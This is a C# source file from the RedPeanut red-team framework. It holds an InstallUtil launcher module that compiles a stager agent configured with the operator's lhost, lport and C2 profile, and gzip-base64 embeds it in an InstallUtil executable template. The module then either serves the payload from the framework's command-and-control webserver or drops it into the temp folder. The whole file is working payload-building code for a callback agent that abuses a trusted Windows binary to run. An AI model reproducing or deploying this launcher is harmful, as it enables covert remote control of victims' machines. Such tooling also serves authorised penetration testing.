//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;

namespace RedPeanut
{
    public class LauncherInstallUtilManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set filename", "Set filename" },
            { "set hosted", "If true add the generated hta to the resources served by webserver" },
            { "set lhost", "Set lhost" },
            { "set lport", "Set lport" },
            { "set profile", "Set profile" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "installutil";
        string filename = null;
        string lhost = null;
        int lport = 0;
        int profile = 0;
        bool hosted = false;

        bool exit = false;

        public LauncherInstallUtilManager()
        {

        }

        public LauncherInstallUtilManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                LauncherMenu(input);
            } while (!exit);
        }

        private void LauncherMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "set hosted":
                            hosted = GetParsedSetBool(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }


        private void Run()
        {
            List<string> args = new List<string>();
            try
            {
                if (string.IsNullOrEmpty(filename) || string.IsNullOrEmpty(lhost) || lport < 1 || profile < 1)
                {
                    return;
                }
                else
                {
                    // Parse .cs sorce and repalce variable
                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                    {
                        ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                        string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);

                        string assemblyBase64 = Builder.GenerateDllBase64(source, "tmp_" + filename);

                        byte[] assemblybytte = Convert.FromBase64String(assemblyBase64);
                        string agentCompBase64 = Convert.ToBase64String(CompressGZipAssembly(assemblybytte));

                        string sourceinstallutil = File.ReadAllText(Path.Combine(folderrpath, INSTALLUTIL_TEMPLATE))
                            .Replace("#{assembly}", agentCompBase64);

                        Builder.GenerateExe(sourceinstallutil, filename);

                        if(File.Exists(Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, ASSEMBLY_OIUTPUT_FOLDER, filename)))
                        {
                            if (hosted)
                            {
                                //Add resource to webserver storage
                                C2Manager c2manager = Program.GetC2Manager();
                                c2manager.GetC2Server().RegisterWebResource(filename, new WebResourceInstance(null, filename));

                                Console.WriteLine("[*] Resource added to webserver resources");
                                return;
                            }
                            else
                            {
                                //Write file to tmp env dir
                                File.WriteAllBytes(Path.Combine(Path.GetTempPath(), filename), 
                                    File.ReadAllBytes(Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, ASSEMBLY_OIUTPUT_FOLDER, filename)));

                                Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), filename));
                            }
                        }
                        else
                        {
                            Console.WriteLine("[x] Error creating IndtallUtil dll");
                        }
                    }

                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Error running task build {0}", e.Message);
                return;
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filename", filename },
                { "hosted", hosted.ToString() },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "profile", profile.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
